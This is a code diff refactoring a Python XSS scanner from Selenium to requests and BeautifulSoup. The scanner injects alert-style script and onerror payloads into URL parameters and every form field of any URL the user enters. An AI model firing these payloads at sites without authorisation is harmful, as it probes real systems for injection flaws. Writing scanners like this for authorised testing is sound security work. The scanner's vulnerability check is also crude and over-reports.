@@ -1,209 +1,140 @@
 import requests
-from selenium import webdriver
-from selenium.webdriver.chrome.service import Service
-from selenium.webdriver.chrome.options import Options
-from webdriver_manager.chrome import ChromeDriverManager
-from selenium.webdriver.common.by import By
-from selenium.webdriver.support.ui import WebDriverWait
-from selenium.webdriver.support import expected_conditions as EC
-from selenium.common.exceptions import TimeoutException, StaleElementReferenceException, InvalidElementStateException
+from bs4 import BeautifulSoup
+from urllib.parse import urljoin, urlparse, parse_qs, urlencode
 import logging
-import argparse
 import time
+import json
 
-# Basic GET request
-def get_request(url):
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+# Function to safely make HTTP GET requests
+def get_request(url, delay=0.2, timeout=10, verify=True):
     try:
-        response = requests.get(url)
-        if response.status_code == 200:
-            return response
-        else:
-            print(f"Failed to fetch {url}. Status code: {response.status_code}")
+        response = requests.get(url, timeout=timeout, verify=verify)
+        time.sleep(delay)  # Rate limiting
+        return response
     except requests.exceptions.RequestException as e:
-        print(f"Error fetching {url}: {e}")
-    return None
+        logging.error(f"Error fetching {url}: {e}")
+        return None
 
-# XSS Payloads
-def get_xss_payloads():
-    return [
-        "<script>alert('XSS')</script>",
-        "<img src=x onerror=alert('XSS')>",
-        "<svg onload=alert('XSS')>",
-        "'\"><script>alert('XSS')</script>",
-        "><script>alert('XSS')</script>"
-    ]
+# Function to load XSS payloads from a JSON file
+def load_payloads(file_path="payloads.json"):
+    try:
+        with open(file_path, "r") as file:
+            return json.load(file)
+    except (FileNotFoundError, json.JSONDecodeError) as e:
+        logging.warning(f"Failed to load payloads from {file_path}: {e}. Using default payloads.")
+        return {
+            "basic": [
+                "\"><script>alert('XSS')</script>",
+                "\"><img src=x onerror=alert('XSS')>"
+            ]
+        }
 
-# Inject payload into URL
+# Function to inject payload into a URL
 def inject_payload(url, payload):
     if "?" in url:
         return url + "&payload=" + payload
     else:
         return url + "?payload=" + payload
 
-# Analyze server response for XSS
+# Function to analyze the response for XSS vulnerabilities
 def analyze_response(response, payload):
     if payload in response.text:
-        if "<script>" in response.text or "alert(" in response.text:
-            return f"XSS vulnerability found! Payload executed: {payload}"
+        if "<script>" in response.text or "alert(" in response.text or "onerror=" in response.text:
+            return {'status': 'vulnerable', 'payload': payload}
         else:
-            return f"Payload reflected but not executed: {payload}"
-    else:
-        return f"No XSS found with payload: {payload}"
+            return {'status': 'reflected', 'payload': payload}
+    return {'status': 'not_vulnerable', 'payload': payload}
 
-# Logging setup
-logging.basicConfig(filename='xss_scan_report.log', level=logging.INFO, 
-                    format='%(asctime)s - %(levelname)s - %(message)s')
-
-# Function to log scan results
-def log_scan_result(url, payload, result):
-    with open("xss_scan_report.log", "a") as log_file:
-        log_file.write(f"{url} | Payload: {payload} | Result: {result}\n")
-
-# Scan for DOM-based XSS
-def scan_dom_xss(url, payload):
-    print(f"Scanning {url} for DOM-based XSS vulnerabilities with payload: {payload}...")
-
-    chrome_options = Options()
-    chrome_options.add_argument("--headless")
-    chrome_options.add_argument("--disable-gpu")
-    chrome_options.add_argument("--no-sandbox")
-    chrome_options.add_argument("--window-size=1920x1080")
-
-    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
-    driver.get(url)
-
-    try:
-        injected_url = inject_payload(url, payload)
-        driver.get(injected_url)
-
-        # Check if payload is present in the page
-        if payload in driver.page_source:
-            # Try executing JavaScript to detect if the payload triggers an alert
-            try:
-                driver.execute_script("return alert()")
-                print(f"DOM-based XSS vulnerability found with payload: {payload}")
-                return f"DOM-based XSS vulnerability found with payload: {payload}"
-            except Exception as e:
-                print(f"Payload reflected but no alert triggered: {payload}")
-                return f"Payload reflected but no alert triggered: {payload}"
-        else:
-            return f"No DOM-based XSS found with payload: {payload}"
-    except Exception as e:
-        print(f"Error scanning DOM: {e}")
-    finally:
-        driver.quit()
-
-
-# Scan forms for XSS
-def scan_forms_for_xss(url, payload):
-    chrome_options = Options()
-    chrome_options.add_argument("--headless")
-    chrome_options.add_argument("--disable-gpu")
-    chrome_options.add_argument("--no-sandbox")
-    chrome_options.add_argument("--window-size=1920x1080")
-
-    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
+# Function to scan a URL for XSS vulnerabilities
+def scan_url(url, delay=0.2):
+    results = {
+        'basic': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []},
+        'obfuscated': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []},
+        'context_specific': {
+            'html': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []},
+            'javascript': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []},
+            'attributes': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []},
+            'url': {'vulnerable': [], 'reflected': [], 'not_vulnerable': []}
+        }
+    }
     
-    try:
-        driver.get(url)
-        print(f"Scanning URL: {url}")
-        forms = driver.find_elements(By.TAG_NAME, 'form')
+    payloads = load_payloads()
+    
+    # Test basic payloads
+    for payload in payloads.get('basic', []):
+        injected_url = inject_payload(url, payload)
+        response = get_request(injected_url, delay)
+        if response:
+            result = analyze_response(response, payload)
+            results['basic'][result['status']].append(payload)
 
-        if forms:
-            print(f"Found {len(forms)} forms on the page.")
-            for form_index, form in enumerate(forms, start=1):
-                print(f"Processing form #{form_index}")
-                input_elements = form.find_elements(By.TAG_NAME, 'input')
+    # Test obfuscated payloads
+    for payload in payloads.get('obfuscated', []):
+        injected_url = inject_payload(url, payload)
+        response = get_request(injected_url, delay)
+        if response:
+            result = analyze_response(response, payload)
+            results['obfuscated'][result['status']].append(payload)
 
-                for input_element in input_elements:
-                    try:
-                        attempts = 3
-                        while attempts > 0:
-                            try:
-                                WebDriverWait(driver, 10).until(
-                                    EC.element_to_be_clickable(input_element)
-                                )
-                                if input_element.is_enabled() and input_element.is_displayed():
-                                    input_element.clear()
-                                    input_element.send_keys(payload)
-                                    print(f"Injected payload into input field.")
-                                else:
-                                    print(f"Input element not interactable: {input_element}. Skipping.")
-                                break
-
-                            except StaleElementReferenceException:
-                                print(f"Stale element reference, retrying... Attempts left: {attempts - 1}")
-                                input_element = form.find_element(By.TAG_NAME, 'input')
-                                attempts -= 1
-
-                    except TimeoutException:
-                        print(f"Input element not interactable after waiting. Skipping to next.")
-                        continue
-
-                    except InvalidElementStateException:
-                        print(f"Invalid element state, cannot interact with this input.")
-                        continue
-
-                print("Submitting form...")
-                form.submit()
-                time.sleep(2)
-
-                if payload in driver.page_source:
-                    result = f"Potential XSS detected in form #{form_index} on {url} with payload {payload}"
-                    print(result)
-                    log_scan_result(url, payload, result)
-                else:
-                    result = f"No XSS detected in form #{form_index} on {url} with payload {payload}"
-                    print(result)
-                    log_scan_result(url, payload, result)
-
-        else:
-            print("No forms found on the page.")
-
-    except Exception as e:
-        print(f"Error occurred during scanning: {e}")
-
-    finally:
-        driver.quit()
-
-# Main scanning function
-def scan_url(url):
-    print(f"Scanning {url} for XSS vulnerabilities...")
-
-    response = get_request(url)
-
-    if response:
-        payloads = get_xss_payloads()
-        for payload in payloads:
-            print(f"\nTesting payload: {payload}")
+    # Test context-specific payloads
+    for context, context_payloads in payloads.get('context_specific', {}).items():
+        for payload in context_payloads:
             injected_url = inject_payload(url, payload)
-            print(f"Injected URL: {injected_url}")
-
-            response = get_request(injected_url)
+            response = get_request(injected_url, delay)
             if response:
                 result = analyze_response(response, payload)
-                log_scan_result(url, payload, result)
+                results['context_specific'][context][result['status']].append(payload)
 
-            dom_result = scan_dom_xss(url, payload)
-            log_scan_result(url, payload, dom_result)
-    else:
-        print("Failed to fetch the URL.")
+    return results
 
-# Parse command-line arguments
-def parse_arguments():
-    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")
-    parser.add_argument('--url', type=str, required=True, help="URL to scan for XSS vulnerabilities")
-    parser.add_argument('--payloads', type=str, nargs='+', help="Custom XSS payloads")
-    return parser.parse_args()
+# Function to scan forms for XSS vulnerabilities
+def scan_forms_for_xss(url, payload):
+    try:
+        response = requests.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        forms = soup.find_all('form')
+        
+        for form in forms:
+            form_action = form.get('action', '')
+            if not form_action.startswith('http'):
+                form_action = urljoin(url, form_action)
+            
+            inputs = form.find_all('input')
+            form_data = {input_tag.get('name'): input_tag.get('value', '') for input_tag in inputs if input_tag.get('name')}
+            
+            # Inject payload into form data
+            for key, value in form_data.items():
+                form_data[key] = payload
+            
+            # Submit the form with injected payload
+            response = requests.post(form_action, data=form_data)
+            
+            # Analyze the response for XSS vulnerabilities
+            result = analyze_response(response, payload)
+            if result['status'] == 'vulnerable':
+                return f"XSS vulnerability found in form at {form_action}"
+    except Exception as e:
+        logging.error(f"Error scanning forms for XSS: {e}")
+    return f"No XSS vulnerability found in form at {url}"
 
+# Function to get XSS payloads
+def get_xss_payloads():
+    return load_payloads().get('basic', [])
+
+# Main function to execute the scanner
 if __name__ == "__main__":
-    args = parse_arguments()
-
-    if args.payloads:
-        payloads = args.payloads
-    else:
-        payloads = get_xss_payloads()
-
+    target_url = input("Enter the URL to scan for XSS vulnerabilities: ")
+    results = scan_url(target_url)
+    print("Scan Results:")
+    print(json.dumps(results, indent=4))
+    
+    # Get a list of XSS payloads
+    payloads = get_xss_payloads()
+    
+    # Scan forms for XSS vulnerabilities
     for payload in payloads:
-        scan_url(args.url)
-        scan_forms_for_xss(args.url, payload)
+        result = scan_forms_for_xss(target_url, payload)
+        print(result)
